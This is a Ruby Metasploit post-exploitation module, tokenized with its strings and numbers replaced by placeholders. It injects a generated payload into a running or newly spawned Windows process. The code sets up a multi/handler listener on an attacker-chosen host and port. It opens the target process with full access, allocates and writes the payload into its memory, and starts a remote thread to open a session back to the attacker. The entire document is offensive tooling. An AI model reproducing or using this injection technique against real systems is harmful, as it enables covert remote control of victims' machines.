require <str> require <str> require <str> class Metasploit3 < Msf :: Post include Msf :: Post :: Common def initialize ( info = { } ) super ( update_info ( info , <str> = > <str> , <str> = > <str> , <str> = > MSF_LICENSE , <str> = > [ <str> , <str> ] , <str> = > [ <str> ] , <str> = > [ <str> ] ) ) register_options ( [ OptString . new ( <str> , [ false , <str> , <str> ] ) , OptAddress . new ( <str> , [ true , <str> ] ) , OptInt . new ( <str> , [ false , <str> , <int> ] ) , OptInt . new ( <str> , [ false , <str> ] ) , OptBool . new ( <str> , [ false , <str> , false ] ) , OptString . new ( <str> , [ false , <str> ] ) , OptInt . new ( <str> , [ false , <str> , <int> ] ) ] , self . class ) end def run print_status ( <str> sysinfo [ <str> ] <str> ) if not sysinfo . nil? if not session . framework . payloads . keys . grep ( <str> ) . include? ( datastore [ <str> ] ) print_error ( <str> datastore [ <str> ] <str> ) return end pay_name = datastore [ <str> ] lhost = datastore [ <str> ] lport = datastore [ <str> ] pid = datastore [ <str> ] opts = datastore [ <str> ] payload = create_payload ( pay_name , lhost , lport , opts ) if pid == <int> or not has_pid? ( pid ) pid = create_temp_proc ( payload ) end if payload . arch . join =~ <str> and client . platform =~ <str> print_error ( <str> ) print_error ( <str> ) return false else create_multihand ( payload , pay_name , lhost , lport ) if datastore [ <str> ] datastore [ <str> ] . times do inject_into_pid ( payload , pid , datastore [ <str> ] ) end end end def check_for_listner ( lhost , lport ) conflict = false client . framework . jobs . each do | k , j | if j . name =~ <str> current_id = j . jid current_lhost = j . ctx [ <int> ] . datastore [ <str> ] current_lport = j . ctx [ <int> ] . datastore [ <str> ] if lhost == current_lhost and lport == current_lport . to_i print_error ( <str> current_id <str> current_lhost <str> current_lport <str> ) conflict = true end end end return conflict end def create_payload ( name , lhost , lport , opts = <str> ) pay = client . framework . payloads . create ( name ) pay . datastore [ <str> ] = lhost pay . datastore [ <str> ] = lport if not opts . blank? opts . split ( <str> ) . each do | o | opt , val = o . split ( <str> , <int> ) pay . datastore [ opt ] = val end end pay . options . validate ( pay . datastore ) return pay end def create_multihand ( pay , pay_name , lhost , lport ) print_status ( <str> ) if not check_for_listner ( lhost , lport ) mul = client . framework . exploits . create ( <str> ) mul . share_datastore ( pay . datastore ) mul . datastore [ <str> ] = client . workspace mul . datastore [ <str> ] = pay_name mul . datastore [ <str> ] = <str> mul . datastore [ <str> ] = false mul . options . validate ( mul . datastore ) mul . exploit_simple ( <str> = > mul . datastore [ <str> ] , <str> = > self . user_input , <str> = > self . user_output , <str> = > true ) else print_error ( <str> ) end end def arch_check ( pay , pid ) client . sys . process . processes . each do | p | if pid == p [ <str> ] print_status ( <str> ) if pay . arch . join == p [ <str> ] print_good ( <str> ) return true else print_error ( <str> p [ <str> ] <str> pay . arch . join <str> ) return false end end end end def create_temp_proc ( pay ) windir = client . sys . config . getenv ( <str> ) if pay . arch . join == <str> and client . platform =~ <str> cmd = <str> windir <str> elsif pay . arch . join == <str> and client . platform =~ <str> cmd = <str> windir <str> elsif pay . arch . join == <str> and client . platform =~ <str> cmd = <str> windir <str> elsif pay . arch . join == <str> and client . platform =~ <str> cmd = <str> windir <str> end proc = client . sys . process . execute ( cmd , nil , { <str> = > true } ) return proc . pid end def inject_into_pid ( pay , pid , newproc ) print_status ( <str> ) if arch_check ( pay , pid ) pid = create_temp_proc ( pay ) if newproc print_status ( <str> pay . name <str> pid <str> ) begin print_status ( <str> pid <str> ) host_process = client . sys . process . open ( pid . to_i , PROCESS_ALL_ACCESS ) print_status ( <str> ) raw = pay . generate print_status ( <str> pid <str> ) mem = host_process . memory . allocate ( raw . length + ( raw . length % <int> ) ) host_process . memory . protect ( mem ) print_status ( <str> % mem <str> raw . length <str> ) print_status ( <str> ) host_process . memory . write ( mem , raw ) host_process . thread . create ( mem , <int> ) print_good ( <str> pid <str> ) rescue :: Exception = > e print_error ( <str> pid <str> ) print_error ( e . to_s ) end end end end 
